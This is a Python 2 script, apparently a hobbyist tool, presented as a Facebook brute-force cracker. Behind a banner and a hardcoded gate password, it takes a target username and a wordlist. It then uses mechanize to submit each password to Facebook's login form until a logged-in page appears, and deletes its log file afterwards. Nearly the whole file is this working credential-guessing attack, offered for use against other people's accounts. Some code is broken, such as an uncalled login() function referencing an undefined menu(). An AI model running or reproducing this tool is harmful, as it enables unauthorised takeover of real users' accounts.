#!/usr/bin/python
# -*- coding: utf-8 -*-
        
        
    


import time
import os

os.system('clear')
time.sleep(0.1)
try:
    import mechanize
except ModuleNotFoundError:
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()

print"\033[1;34;40m ╭━━╮╭━━━┳━━━━┳━━━┳╮"
print"\033[1;34;40m ┃╭╮┃┃╭━╮┃╭╮╭╮┃╭━╮┃┃\033[1;32;40mB"
print"\033[1;34;40m ┃╰╯╰┫┃╱┃┣╯┃┃╰┫┃╱┃┃┃\033[1;33;40mA"
print"\033[1;34;40m ┃╭━╮┃┃╱┃┃╱┃┃╱┃┃╱┃┃┃╱╭╮\033[1;36;40mB"
print"\033[1;34;40m ┃╰━╯┃╰━╯┃╱┃┃╱┃╰━╯┃╰━╯┃\033[1;31;40mA"
print"\033[1;34;40m ╰━━━┻━━━╯╱╰╯╱╰━━━┻━━━╯"
print"\033[1;30;40m It'S NOT JUST A NAME,  IT'S A BRAND"
print""
print"\033[1;34;40m__________________________________________________________"
print"\033[1;32;40m▶\033[1;35;40mAuthor : MONIR HOSSAIN"
print"\033[1;32;40m▶\033[1;35;40mGitHub : https://Github.com/botolmonir"
print"\033[1;32;40m▶\033[1;35;40mFacebook : m.facebook.com/monir.hossain.8"
print"\033[1;34;40m__________________________________________________________"
print" \033[1;30;40mTool : facebook bruteforce/use vpn"
print"\033[1;32;40m<-----------------©------------------->"
print""

CorrectUsername = "BOTOL"
CorrectPassword = "BABA"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;33;40m[☆] \x1b[1;33;40mUSERNAME \x1b[1;37;40m->> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;33;40m[☆] \x1b[1;33;40mPASSWORD \x1b[1;37;40m->> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "wrong -> contact with monir!"
            os.system('xdg-open https://m.facebook.com/monir.hossain.8')
    else:
        print "wrong -> contact with monir!"
        os.system('xdg-open https://m.facebook.com/monir.hossain.8')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		
user = raw_input('\033[1;34;40m[?] Target Username/ID/Email ->> ')
time.sleep(0.1)
wrdlstFileName = raw_input('\n\033[1;34;40m[?] Wordlist Directory ->> ')
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File Not Found!')
    exit()

time.sleep(0.1)
print '\n\nCracking '+user+' Now...'

time.sleep(0.1)
print '\n\033[1;34;40m<<<BOTOL-BABA>>>\n'
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '[+] Password Found ðŸ”³ '+password 
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "[!] Wrong Password! ðŸ”² "+str(password)
        except KeyboardInterrupt:
            print '\n#############################################\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()

time.sleep(0.1)
print 'Password is not Crack // Try again //.'
time.sleep(0.1)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
